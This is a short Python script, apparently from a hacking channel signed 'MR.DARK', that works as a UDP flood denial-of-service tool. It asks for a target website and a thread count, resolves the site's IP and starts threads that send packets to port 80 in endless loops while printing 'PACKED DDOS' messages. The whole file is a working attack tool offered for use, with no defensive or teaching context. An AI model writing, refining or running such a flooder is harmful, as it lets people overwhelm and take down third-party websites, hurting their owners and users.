from colorama import Fore
import time
import socket
import sys
import _thread
import os

os.system("clear")

class dark:
  print(Fore.YELLOW+"=====================================")
  print(Fore.GREEN+"coding = "+Fore.WHITE+"MR.DARK")
  print(Fore.GREEN+"My chaneel = "+Fore.WHITE+"https://t.me/Cyber_Seven")
  print(Fore.GREEN+"HACKED website")
  print(Fore.YELLOW+"=====================================")
  print("\n")

site = input(Fore.GREEN+"Enter your url => "+Fore.RED)
thread_count = input(Fore.GREEN+"Enter your port => "+Fore.RED)
ip = socket.gethostbyname(site)
UDP_PORT = 80
MESSAGE = 'MR.DARK'
print(Fore.GREEN+"your Target IP:", ip)
print(Fore.GREEN+"your Target port:", UDP_PORT)
time.sleep(3)
def ddos(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        print(Fore.RED+"Packet Sent your ip ==> "+Fore.GREEN+ip+Fore.RED+" <<<PACKED DDOS MR.DARK>>>")
for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
    except KeyboardInterrupt:
        sys.exit(0)
while 1:
    pass